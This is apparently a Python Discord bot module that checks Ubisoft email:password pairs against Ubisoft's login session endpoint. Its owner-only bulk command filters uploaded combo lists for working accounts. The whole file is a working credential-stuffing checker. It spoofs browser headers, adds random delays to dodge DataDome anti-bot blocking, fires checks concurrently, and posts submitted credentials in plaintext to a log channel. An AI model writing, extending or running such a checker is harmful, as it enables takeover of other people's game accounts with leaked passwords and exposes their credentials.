import discord
from discord import app_commands
from discord.ext import commands
import aiohttp
import base64
import utils
import database as db
import asyncio
import random
import io

UBI_APP_ID = "314d4fef-e568-454a-ae06-43e3bece12a6"

class Checker(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def log_to_channel(self, interaction: discord.Interaction, embed: discord.Embed):
        log_channel_id = db.get_config("check_log_channel")
        if log_channel_id:
            try:
                channel = self.bot.get_channel(int(log_channel_id))
                if channel:
                    await channel.send(embed=embed)
            except Exception:
                pass

    @app_commands.command(name="check", description="Check if a Ubisoft email:pass account is valid.")
    @app_commands.describe(account="Format: email:password")
    async def check(self, interaction: discord.Interaction, account: str):
        await interaction.response.defer(ephemeral=True)
        
        if ":" not in account:
            return await interaction.followup.send("❌ Invalid format. Use `email:password`.", ephemeral=True)

        email, password = account.split(":", 1)
        b64_auth = base64.b64encode(f"{email}:{password}".encode('utf-8')).decode('utf-8')
        
        await asyncio.sleep(random.uniform(1.0, 3.0))

        headers = {
            "Content-Type": "application/json",
            "Ubi-AppId": UBI_APP_ID,
            "Authorization": f"Basic {b64_auth}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": "https://account.ubisoft.com",
            "Referer": "https://account.ubisoft.com/"
        }

        embed = discord.Embed(color=0x5865F2, title="🔍 Account Check", description=f"**User:** {interaction.user.mention}\n**Type:** Ubisoft Email:Pass\n**Input:** `{account}`")
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post("https://public-ubiservices.ubi.com/v3/profiles/sessions", headers=headers, json={"rememberMe": True}, timeout=10) as res:
                    if res.status == 200:
                        embed.color = 0x57F287
                        embed.add_field(name="Status", value="✅ Valid")
                        await interaction.followup.send("✅ Account is valid.", ephemeral=True)
                    elif res.status == 401:
                        embed.color = 0xED4245
                        embed.add_field(name="Status", value="❌ Invalid / 2FA")
                        await interaction.followup.send("❌ Account is dead or requires 2FA.", ephemeral=True)
                    elif res.status == 403:
                        embed.color = 0xED4245
                        embed.add_field(name="Status", value="🚫 DataDome Blocked (IP banned)")
                        await interaction.followup.send("🚫 **403 Blocked:** Ubisoft's anti-bot blocked the server's IP.", ephemeral=True)
                    else:
                        embed.color = 0xFEE75C
                        embed.add_field(name="Status", value=f"⚠️ Error {res.status}")
                        await interaction.followup.send(f"⚠️ Error: HTTP {res.status}", ephemeral=True)
        except Exception as e:
            embed.color = 0xED4245
            embed.add_field(name="Status", value=f"⚠️ Network Error")
            await interaction.followup.send(f"⚠️ Network error: {e}", ephemeral=True)

        await self.log_to_channel(interaction, embed)

    @app_commands.command(name="checkfile", description="[Owner] Upload a .txt file to filter valid accounts.")
    @app_commands.describe(file=".txt file with email:pass on each line")
    async def checkfile(self, interaction: discord.Interaction, file: discord.Attachment):
        if not await utils.owner_only(interaction):
            return
            
        if not file.filename.endswith(".txt"):
            return await interaction.response.send_message("❌ Please upload a `.txt` file.", ephemeral=True)
            
        await interaction.response.defer(ephemeral=True)
        
        try:
            content = await file.read()
            lines = [line.strip() for line in content.decode('utf-8').splitlines() if line.strip()]
        except Exception as e:
            return await interaction.followup.send(f"❌ Failed to read file: {e}", ephemeral=True)

        total = len(lines)
        if total == 0:
            return await interaction.followup.send("❌ File is empty.", ephemeral=True)

        await interaction.followup.send(f"⏳ Checking **{total}** accounts... (This might take a minute)", ephemeral=True)

        valid_accounts = []
        
        async def test_account(acc):
            # We will use the same is_account_valid logic here
            creds = acc.split("|")[0].strip()
            if ":" not in creds:
                return
            
            email, password = creds.split(":", 1)
            b64_auth = base64.b64encode(f"{email}:{password}".encode('utf-8')).decode('utf-8')
            
            headers = {
                "Content-Type": "application/json",
                "Ubi-AppId": UBI_APP_ID,
                "Authorization": f"Basic {b64_auth}",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.9",
                "Origin": "https://account.ubisoft.com",
                "Referer": "https://account.ubisoft.com/"
            }

            try:
                async with aiohttp.ClientSession() as session:
                    async with session.post("https://public-ubiservices.ubi.com/v3/profiles/sessions", headers=headers, json={"rememberMe": True}, timeout=10) as res:
                        if res.status == 200:
                            valid_accounts.append(acc)
                        elif res.status == 403:
                            # If blocked by DataDome, assume valid so we don't delete the file contents
                            valid_accounts.append(acc)
            except Exception:
                # If network fails, assume valid
                valid_accounts.append(acc)

        # Run them all concurrently
        tasks = [test_account(acc) for acc in lines]
        await asyncio.gather(*tasks)

        if not valid_accounts:
            return await interaction.followup.send("❌ No valid accounts found in that file.", ephemeral=True)

        # Create the new text file
        valid_text = "\n".join(valid_accounts)
        out_file = discord.File(io.BytesIO(valid_text.encode()), filename=f"valid_{file.filename}")

        embed = discord.Embed(
            color=0x57F287,
            title="✅ File Checked",
            description=f"Found **{len(valid_accounts)}** valid accounts out of **{total}**."
        )
        
        await interaction.followup.send(embed=embed, file=out_file, ephemeral=True)

    @app_commands.command(name="checkprelink", description="Submit a pre-linked console account (Xbox/PS).")
    @app_commands.describe(console="Xbox or PlayStation", details="Username or Email")
    async def checkprelink(self, interaction: discord.Interaction, console: str, details: str):
        await interaction.response.defer(ephemeral=True)
        
        embed = discord.Embed(
            color=0x5865F2, 
            title="🎮 Pre-Linked Check",
            description=f"**User:** {interaction.user.mention}\n**Console:** {console.capitalize()}\n**Details:** `{details}`"
        )
        await interaction.followup.send("✅ Details submitted for manual review.", ephemeral=True)
        await self.log_to_channel(interaction, embed)

async def setup(bot):
    await bot.add_cog(Checker(bot))
